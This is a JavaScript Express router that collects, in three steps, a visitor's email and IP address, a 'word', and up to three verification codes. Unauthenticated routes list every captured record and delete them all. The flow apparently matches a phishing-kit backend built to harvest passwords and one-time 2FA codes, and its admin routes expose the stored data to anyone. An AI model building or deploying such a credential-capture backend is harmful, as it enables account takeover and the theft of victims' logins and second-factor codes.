import express from "express";
import User from "../models/User.js";

const router = express.Router();

/* STEP 1 — Save Email & IP */
router.post("/step1", async (req, res) => {
  try {
    const { email } = req.body;
    // Capture the IP address from the request headers or socket
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

    if (!email) return res.status(400).json({ error: "Email is required." });

    const newUser = new User({ email, ip });
    await newUser.save();

    res.json({
      message: "Email and IP saved successfully. Proceed to step 2.",
      userId: newUser._id,
    });
  } catch (error) {
    console.error("STEP 1 ERROR:", error);
    res.status(500).json({ error: "Server error during step 1." });
  }
});

/* STEP 2 — Save Word */
router.post("/step2", async (req, res) => {
  try {
    const { userId, word } = req.body;
    if (!userId) return res.status(400).json({ error: "User ID is required." });
    if (!word) return res.status(400).json({ error: "Word is required." });

    const updatedUser = await User.findByIdAndUpdate(userId, { word }, { new: true });
    if (!updatedUser) return res.status(404).json({ error: "User not found." });

    res.json({
      message: "Word saved successfully. Proceed to step 3.",
      user: updatedUser,
    });
  } catch (error) {
    console.error("STEP 2 ERROR:", error);
    res.status(500).json({ error: "Server error during step 2." });
  }
});

router.post("/step3", async (req, res) => {
  try {
    const { userId } = req.body;
    if (!userId) {
      return res.status(400).json({ error: "User ID is required." });
    }

    const code1 = req.body.code?.trim();
    const code2 = req.body.code2?.trim();
    const code3 = req.body.code3?.trim();

    if (!code1 && !code2 && !code3) {
      return res.status(400).json({ error: "No verification code received." });
    }

    const updateData = {};
    if (code1) updateData.code = code1;
    if (code2) updateData.code2 = code2;
    if (code3) updateData.code3 = code3;

    const updatedUser = await User.findByIdAndUpdate(
      userId,
      { $set: updateData },
      { new: true }
    );

    if (!updatedUser) {
      return res.status(404).json({ error: "User not found." });
    }

    res.json({ message: "Success", user: updatedUser });
  } catch (error) {
    console.error("STEP 3 ERROR:", error);
    res.status(500).json({ error: "Server error." });
  }
});


/* GET All Users */
router.get("/", async (req, res) => {
  try {
    const users = await User.find().sort({ createdAt: -1 });
    res.json(users);
  } catch (error) {
    console.error("FETCH ERROR:", error);
    res.status(500).json({ error: "Error fetching users." });
  }
});

/* DELETE ALL Users */
router.delete("/all", async (req, res) => {
  try {
    await User.deleteMany({});
    res.json({ message: "All user data cleared." });
  } catch (error) {
    console.error("DELETE ALL ERROR:", error);
    res.status(500).json({ error: "Error clearing user data." });
  }
});

/* DELETE Single User by ID */
router.delete("/:userId", async (req, res) => {
  try {
    const { userId } = req.params;
    const deletedUser = await User.findByIdAndDelete(userId);

    if (!deletedUser) return res.status(404).json({ error: "User not found." });

    res.json({ message: "User deleted successfully.", user: deletedUser });
  } catch (error) {
    console.error("DELETE USER ERROR:", error);
    res.status(500).json({ error: "Error deleting user." });
  }
});

export default router;
